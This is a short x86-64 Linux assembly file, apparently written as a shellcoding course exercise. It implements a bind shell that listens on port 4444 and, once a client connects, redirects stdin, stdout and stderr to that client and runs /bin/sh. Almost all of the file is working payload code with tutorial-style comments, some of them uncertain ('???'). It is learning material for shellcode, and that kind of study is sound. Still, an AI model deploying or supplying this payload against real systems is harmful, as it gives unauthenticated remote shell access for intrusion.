; David @InfinitelyManic
; Code inspired by  http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/
; bind shell
; name -a
; Linux ubuntuserver00A 4.4.0-71-generic #92-Ubuntu SMP Fri Mar 24 12:59:01 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

; lsb_release -a
; No LSB modules are available.
; Distributor ID: Ubuntu
; Description:    Ubuntu 16.04.3 LTS
; Release:        16.04
; Codename:       xenial

; remove the nulls

section .bss
section .data
section .text
        global _start

_start:
        nop

        ; man 2 syscall
        ;  x86_64        rdi   rsi   rdx   r10   r8    r9    -

        ; socket(int domain, int type, int protocol);

        ; domain argument specifies communication domain; this selects protocol family
        ;  AF_INET IPv4 Internet protocols

        ; type, which specifies the communication semantics
        ; SOCK_STREAM

        ; socket = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 41
        mov rax, 41             ; syscall
        mov rdi, 2              ; domain
        mov rsi, 1              ; type
        mov rdx, 0              ; proto
        syscall
                                ; socket descriptor returned in rax
        ; copy socket descriptor to rdi for future use
        mov rdi, rax            ; save sockfd


        ; struct sockaddr...
        ; set up data structure on stack
        ; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = INADDR_ANY
        ; bzero(&server.sin_zero, 8)
        xor rax, rax                            ; init eight bytes to 0
        push rax                                ; 0x0000 0000 0000 0000
        ; mov dword [rsp-4], eax                ; 0x0000 0000
        mov dword [rsp-4], 0xdeadc0de           ; extra padding b bytes
        mov word [rsp-6], 0x5c11                ; 0x     5c11 0000 port 4444 in network byte order = 0x115c
        mov word [rsp-8], 0x02                  ; 0x          0002              domain
        sub rsp, 8                              ; 0x0000 0000 5c11 0002


        ; bind - bind a name to a socket
        ; bind(sockfd, (struct sockaddr *)&server, sockaddr_len)
        ;      rdi      rsi                        rdx
        ; syscall number 49
        mov rax, 49                             ; syscall bind
        ; rdi                                   ; sockfd
        mov rsi, rsp                            ; 0x0000 0000 5c11 0002
        mov rdx, 16                             ; length of ?
        syscall


        ; listen(sock, MAX_CLIENTS)
        ; syscall number 50
        mov rax, 50                             ; syscall listen
        ; rdi                                   ; sockfd
        mov rsi, 2                              ; ???
        syscall
        ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
        ;              rdi    rsi                        rdx
        ; syscall number 43
        mov rax, 43                             ; syscall accept
        sub rsp, 16                             ; ?
        ; rdi                                   ; sockfd
        mov rsi, rsp                            ; saving?
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp
        syscall

        ; store the client socket description
        mov r9, rax

        ; close parent
        mov rax, 3
        syscall

        ; duplicate sockets
        ; int dup2(int oldfd, int newfd);
        ; p2()
        ;The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the descriptor number spec
        ; -ified in newfd.  If the descriptor newfd was previously open, it is silently closed before being reused.
        ; dup2 (new, old)
        mov rax, 33
        mov rdi, r9             ; oldfd
        mov rsi, 0              ; newfd =std in
        syscall

        mov rax, 33
        ; rdi
        mov rsi, 1              ; newfd = std out
        syscall

        mov rax, 33
        ; rdi
        mov rsi, 2              ; newfd = std error
        syscall

        ; execve *************************************
        ; First NULL push
        xor rax, rax
        push rax

        ; push /bin//sh in reverse
        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI
        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp

        ; Push address of /bin//sh
        push rdi

        ; set RSI
        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
                                                              
